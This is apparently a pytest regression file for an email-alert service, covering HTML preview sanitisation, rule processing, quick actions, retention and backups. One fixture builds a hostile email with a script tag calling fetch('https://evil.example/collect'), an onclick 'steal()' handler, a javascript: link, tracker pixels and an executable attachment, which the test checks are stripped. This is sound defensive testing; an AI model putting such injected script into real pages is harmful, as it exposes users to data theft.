"""Phase 9 Email Alerts security, Activity and operations regressions."""

from __future__ import annotations

from email.message import EmailMessage
from pathlib import Path

from api.platform import PlatformAPI
from api.security import hash_password
from dispatcher import Dispatcher
from email_alert_pipeline import EmailAlertProcessor, email_message_text
from email_security import build_email_preview
from inputs.email_mailboxes import MailboxConnectionService
from storage.audit_events import AuditEventStore
from storage.backups import StateBackupStore
from storage.database import Database
from storage.email_alerts import EmailAlertStore
from storage.housekeeping import HousekeepingService
from storage.ownership import Actor
from storage.secrets import SecretStore
from storage.users import UserStore


ROOT = Path(__file__).resolve().parents[1]
PASSWORD = "correct horse battery staple"


def fast_hash(password: str) -> str:
    return hash_password(password, salt=b"\\x08" * 16, iterations=1_000)


class Configuration:
    def __init__(self, data=None):
        self.data = data or {}

    def get(self, *keys, default=None):
        value = self.data
        for key in keys:
            if not isinstance(value, dict) or key not in value:
                return default
            value = value[key]
        return value


def create_user(database, identifier="u" * 32, username="owner", role="user"):
    with database.transaction() as connection:
        connection.execute(
            """
            INSERT INTO users(
                id, username, username_normalized, password_hash,
                role, enabled, created_at, updated_at
            ) VALUES (?, ?, ?, 'hash', ?, 1, 1, 1)
            """,
            (identifier, username, username.casefold(), role),
        )
    return Actor(identifier, role)


def html_message_with_attachments() -> bytes:
    message = EmailMessage()
    message["From"] = "monitor@example.com"
    message["To"] = "alerts@example.com"
    message["Subject"] = "Security preview"
    message.set_content(
        """
        <div onclick="steal()">
          <strong>Database warning</strong>
          <script>fetch('https://evil.example/collect')</script>
          <style>body{background:url(https://tracker.example/pixel)}</style>
          <img src="https://tracker.example/pixel.png">
          <iframe src="https://evil.example/frame"></iframe>
          <a href="javascript:alert(1)">unsafe link</a>
          <a href="https://safe.example/runbook">safe runbook</a>
        </div>
        """,
        subtype="html",
    )
    message.add_attachment(
        b"TOP-SECRET-PDF-ATTACHMENT",
        maintype="application",
        subtype="pdf",
        filename="report.pdf",
    )
    message.add_attachment(
        b"MZ-UNSAFE-EXECUTABLE",
        maintype="application",
        subtype="x-msdownload",
        filename="payload.exe",
    )
    return message.as_bytes()


def test_email_preview_sanitizes_html_and_never_retains_attachment_payloads():
    preview = build_email_preview(html_message_with_attachments())

    assert "Database warning" in preview.text
    assert "Database warning" in preview.html
    assert "<script" not in preview.html.casefold()
    assert "<style" not in preview.html.casefold()
    assert "<iframe" not in preview.html.casefold()
    assert "<img" not in preview.html.casefold()
    assert "onclick" not in preview.html.casefold()
    assert "javascript:" not in preview.html.casefold()
    assert "tracker.example" not in preview.html.casefold()
    assert 'href="https://safe.example/runbook"' in preview.html
    assert preview.active_content_blocked >= 3
    assert preview.remote_content_blocked >= 1

    assert len(preview.attachments) == 2
    by_name = {item.name: item for item in preview.attachments}
    assert by_name["report.pdf"].within_policy is True
    assert by_name["payload.exe"].within_policy is False
    assert all(item.retained is False for item in preview.attachments)

    assert b"TOP-SECRET-PDF-ATTACHMENT" not in preview.retained_source
    assert b"MZ-UNSAFE-EXECUTABLE" not in preview.retained_source
    assert b"tracker.example" not in preview.retained_source
    assert email_message_text(preview.retained_source) == preview.text


def test_activity_contains_only_messages_that_nowlert_processed(tmp_path):
    database = Database(tmp_path / "state" / "nowlert.db")
    database.migrate()
    actor = create_user(database)
    store = EmailAlertStore(database, clock=lambda: 2_000_000_000)
    mailbox = store.create_mailbox(
        actor,
        actor.user_id,
        "imap",
        "alerts@example.com",
        name="Operations",
    )
    processed, _ = store.record_message(
        actor,
        mailbox.id,
        provider_message_id="processed",
        sender="monitor@example.com",
        recipients=["alerts@example.com"],
        subject="Processed alert",
    )
    untouched, _ = store.record_message(
        actor,
        mailbox.id,
        provider_message_id="untouched",
        sender="newsletter@example.com",
        recipients=["alerts@example.com"],
        subject="Mailbox-only message",
    )
    store.record_processing(
        actor,
        processed.id,
        "ignored",
        details={"reason": "no_matching_rule"},
    )

    activity = store.list_activity_messages(actor)

    assert [item.id for item in activity] == [processed.id]
    assert untouched.id not in {item.id for item in activity}

    api = PlatformAPI(database, Dispatcher(), Configuration())
    response = api._email_activity_endpoint("GET", actor)
    assert [item["id"] for item in response.payload["messages"]] == [
        processed.id
    ]


class DeliverySummary:
    matched_routes = 1
    delivered = 1
    failed = 0
    attempts = 1


class Delivery:
    def deliver(self, _actor, _notification):
        return DeliverySummary()


def test_processing_history_explains_rule_conditions_and_resulting_severity(
    tmp_path,
):
    database = Database(tmp_path / "state" / "nowlert.db")
    database.migrate()
    actor = create_user(database)
    store = EmailAlertStore(database, clock=lambda: 2_000_000_000)
    mailbox = store.create_mailbox(
        actor,
        actor.user_id,
        "imap",
        "alerts@example.com",
        name="Operations",
    )
    group = store.create_group(actor, actor.user_id, "Databases")
    rule = store.create_rule(
        actor,
        actor.user_id,
        group.id,
        "Database monitor",
        "urgent",
        [
            {
                "field": "sender_domain",
                "operator": "equals",
                "value": "monitoring.example.com",
            },
            {
                "field": "subject",
                "operator": "contains",
                "value": "replication",
            },
        ],
        match_mode="all",
    )
    message, _ = store.record_message(
        actor,
        mailbox.id,
        provider_message_id="message-1",
        sender="zabbix@monitoring.example.com",
        recipients=["alerts@example.com"],
        subject="PostgreSQL replication stopped",
    )
    processor = EmailAlertProcessor(
        database,
        store=store,
        delivery=Delivery(),
        clock=lambda: 2_000_000_000,
    )

    result = processor.process(actor, message.id)
    latest = store.latest_processing(actor, message.id)

    assert result.action == "promoted"
    assert latest is not None
    assert latest.rule_id == rule.id
    assert latest.classification == "urgent"
    assert latest.details["resulting_classification"] == "urgent"
    assert latest.details["resulting_severity"] == "critical"
    assert latest.details["matched_conditions"] == [
        {
            "field": "sender_domain",
            "operator": "equals",
            "value": "monitoring.example.com",
            "matched": True,
        },
        {
            "field": "subject",
            "operator": "contains",
            "value": "replication",
            "matched": True,
        },
    ]


def test_activity_quick_actions_create_working_ignore_rules_and_change_severity(
    tmp_path,
):
    database = Database(tmp_path / "state" / "nowlert.db")
    database.migrate()
    actor = create_user(database)
    api = PlatformAPI(database, Dispatcher(), Configuration())
    store = api.email_connections.store
    mailbox = store.create_mailbox(
        actor,
        actor.user_id,
        "imap",
        "alerts@example.com",
        name="Operations",
    )
    group = store.create_group(actor, actor.user_id, "Infrastructure")
    rule = store.create_rule(
        actor,
        actor.user_id,
        group.id,
        "Monitoring warning",
        "warning",
        [{"field": "subject", "operator": "contains", "value": "database"}],
        priority=50,
    )
    message, _ = store.record_message(
        actor,
        mailbox.id,
        provider_message_id="activity-message",
        sender="monitor@monitoring.example.com",
        recipients=["alerts@example.com"],
        subject="Re: Database latency high",
    )
    store.record_processing(
        actor,
        message.id,
        "promoted",
        classification="warning",
        group_id=group.id,
        rule_id=rule.id,
        details={
            "matched_conditions": [
                {
                    "field": "subject",
                    "operator": "contains",
                    "value": "database",
                    "matched": True,
                }
            ],
            "resulting_severity": "warning",
        },
    )
    store.update_group(actor, group.id, enabled=False)

    ignored = api._email_message_action(
        "POST",
        {},
        actor,
        message.id,
        "ignore-sender",
    )
    ignore_rule = ignored.payload["rule"]
    quick_group = store.get_group(actor, ignore_rule["group_id"])
    assert ignored.status == 201
    assert quick_group.enabled is True
    assert ignore_rule["classification"] == "ignore"
    assert ignore_rule["priority"] == 0
    assert ignore_rule["conditions"] == [
        {
            "field": "sender",
            "operator": "equals",
            "value": "monitor@monitoring.example.com",
        }
    ]

    muted = api._email_message_action(
        "POST",
        {},
        actor,
        message.id,
        "mute-similar",
    )
    assert muted.payload["rule"]["classification"] == "ignore"
    assert muted.payload["rule"]["conditions"] == [
        {
            "field": "subject",
            "operator": "contains",
            "value": "Database latency high",
        }
    ]

    changed = api._email_message_action(
        "POST",
        {"classification": "urgent"},
        actor,
        message.id,
        "change-severity",
    )
    assert changed.payload["rule"]["id"] == rule.id
    assert changed.payload["rule"]["classification"] == "urgent"

    with database.connect() as connection:
        actions = {
            str(row["action"])
            for row in connection.execute(
                """
                SELECT action FROM audit_events
                WHERE action LIKE 'email.%'
                """
            )
        }
    assert "email.activity.ignore_sender" in actions
    assert "email.activity.mute_similar" in actions
    assert "email.rule.change_severity" in actions


def test_housekeeping_applies_separate_email_retention_controls(tmp_path):
    now = 2_000_000_000
    old = now - 100 * 86400
    database = Database(tmp_path / "state" / "nowlert.db")
    database.migrate()
    users = UserStore(database, password_hasher=fast_hash)
    admin = users.bootstrap_admin("administrator", PASSWORD)
    store = EmailAlertStore(database, clock=lambda: old)
    mailbox = store.create_mailbox(
        admin.actor,
        admin.id,
        "imap",
        "alerts@example.com",
        name="Operations",
    )
    message, _ = store.record_message(
        admin.actor,
        mailbox.id,
        provider_message_id="old-message",
        sender="monitor@example.com",
        recipients=["alerts@example.com"],
        subject="Old processed message",
        metadata_retention_days=0,
    )
    store.store_raw_content(
        admin.actor,
        message.id,
        b"From: monitor@example.com\n\nSanitized body",
        retention_days=0,
    )
    store.record_processing(
        admin.actor,
        message.id,
        "ignored",
        details={"reason": "test"},
        retention_days=0,
    )

    service = HousekeepingService(database, clock=lambda: now)
    service.update_settings(
        admin.actor,
        {
            "enabled": True,
            "time": "03:15",
            "delivery_history_days": 0,
            "audit_history_days": 0,
            "backup_run_history_days": 0,
            "email_message_metadata_days": 180,
            "email_raw_content_days": 7,
            "email_processing_history_days": 90,
        },
    )
    first = service.run(admin.actor)

    assert first["email_raw_content_deleted"] == 1
    assert first["email_processing_deleted"] == 1
    assert first["email_messages_deleted"] == 0
    assert store.get_message(admin.actor, message.id).id == message.id

    status = service.status()
    assert status["email_message_metadata"]["rows"] == 1
    assert status["email_raw_content"]["rows"] == 0
    assert status["email_processing_history"]["rows"] == 0

    service.update_settings(
        admin.actor,
        {
            "enabled": True,
            "time": "03:15",
            "delivery_history_days": 0,
            "audit_history_days": 0,
            "backup_run_history_days": 0,
            "email_message_metadata_days": 90,
            "email_raw_content_days": 7,
            "email_processing_history_days": 90,
        },
    )
    second = service.run(admin.actor)
    assert second["email_messages_deleted"] == 1


def test_state_backup_preserves_email_alert_state_and_mailbox_secret(tmp_path):
    database = Database(tmp_path / "state" / "nowlert.db")
    database.migrate()
    users = UserStore(database, password_hasher=fast_hash)
    admin = users.bootstrap_admin("administrator", PASSWORD)
    service = MailboxConnectionService(database)
    mailbox = service.create_mailbox(
        admin.actor,
        admin.id,
        "imap",
        "alerts@example.com",
        name="Operations",
        settings={
            "host": "imap.example.com",
            "port": 993,
            "security": "ssl",
            "folder": "INBOX",
        },
        credential={
            "username": "alerts@example.com",
            "password": "private-app-password",
        },
    )
    message, _ = service.store.record_message(
        admin.actor,
        mailbox.id,
        provider_message_id="backup-message",
        sender="monitor@example.com",
        recipients=["alerts@example.com"],
        subject="Backup coverage",
    )
    service.store.store_raw_content(
        admin.actor,
        message.id,
        b"From: monitor@example.com\n\nSanitized preview",
    )
    service.store.record_processing(
        admin.actor,
        message.id,
        "ignored",
        details={"reason": "backup-test"},
    )
    secret_id = service.store.mailbox_secret_id(admin.actor, mailbox.id)

    backups = StateBackupStore(database, audit=AuditEventStore(database))
    backup = backups.create(admin.actor)
    service.delete_mailbox(admin.actor, mailbox.id)

    with database.connect() as connection:
        assert connection.execute(
            "SELECT COUNT(*) FROM email_messages"
        ).fetchone()[0] == 0

    backups.restore(admin.actor, backup.id, backup.id)

    restored_store = EmailAlertStore(database)
    restored_mailbox = restored_store.get_mailbox(admin.actor, mailbox.id)
    restored_message = restored_store.get_message(admin.actor, message.id)
    restored_content = restored_store.read_raw_content(admin.actor, message.id)
    restored_processing = restored_store.list_processing(
        admin.actor,
        message_id=message.id,
    )
    restored_secret = SecretStore(database).resolve(admin.actor, secret_id)

    assert restored_mailbox.address == "alerts@example.com"
    assert restored_message.subject == "Backup coverage"
    assert b"Sanitized preview" in restored_content
    assert restored_processing[0].details["reason"] == "backup-test"
    assert b"private-app-password" in restored_secret


def test_phase9_webui_exposes_safe_activity_actions_and_retention_controls():
    script = (ROOT / "src" / "webui" / "email_alerts.js").read_text(
        encoding="utf-8"
    )
    markup = (ROOT / "src" / "webui" / "index.html").read_text(
        encoding="utf-8"
    )
    app = (ROOT / "src" / "webui" / "app.js").read_text(
        encoding="utf-8"
    )

    for label in (
        "Edit Rule",
        "Mute Similar",
        "Ignore Sender",
        "Change Severity",
        "Open Original Email",
        "Alert me like this",
    ):
        assert label in script
    for action in (
        "preview-message",
        "mute-similar",
        "ignore-sender",
        "change-severity",
        "alert-like-this",
    ):
        assert action in script

    assert 'sandbox: ""' in script
    assert 'referrerpolicy: "no-referrer"' in script
    assert "frame.srcdoc" in script
    assert "attachments are never retained" in script.casefold()
    assert "This is not a mailbox replica." in script
    assert "innerHTML" not in script
    assert "localStorage" not in script
    assert "eval(" not in script

    for identifier in (
        "housekeeping-email-metadata-days",
        "housekeeping-email-content-days",
        "housekeeping-email-processing-days",
    ):
        assert f'id="{identifier}"' in markup
        assert identifier in app
    for setting in (
        "email_message_metadata_days",
        "email_raw_content_days",
        "email_processing_history_days",
    ):
        assert setting in app
